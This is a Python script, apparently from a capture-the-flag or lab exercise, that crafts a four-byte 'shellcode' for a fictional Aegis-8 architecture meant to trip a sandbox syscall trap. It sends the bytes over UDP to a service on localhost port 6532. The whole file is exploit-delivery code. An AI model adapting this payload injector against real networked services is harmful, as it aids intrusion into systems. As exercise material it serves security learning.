import socket
import struct
import argparse

# Configuration
TARGET_IP = "127.0.0.1"
TARGET_PORT = 0x1984 # Port 6532

def create_payload():
    # --- Aegis-8 Assembly ---
    # 0x43 0x02 -> LD A, 0x02   (Load ID for 'Net Open')
    # 0xFF      -> SYSCALL      (Trigger Sandbox Trap)
    # 0x00      -> NOP          (Padding)
    
    payload = b'\x43\x02\xFF\x00'
    return payload

def send_exploit(ip, port, data):
    print(f"[*] Target: {ip}:{port}")
    print(f"[*] Sending {len(data)} bytes of shellcode...")
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        sock.sendto(data, (ip, port))
        print("[+] Payload sent successfully.")
    except Exception as e:
        print(f"[-] Error: {e}")
    finally:
        sock.close()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Aegis-8 Payload Injector')
    parser.add_argument('--ip', default=TARGET_IP, help='Target IP')
    parser.add_argument('--port', type=int, default=TARGET_PORT, help='Target Port')
    args = parser.parse_args()

    shellcode = create_payload()
    send_exploit(args.ip, args.port, shellcode)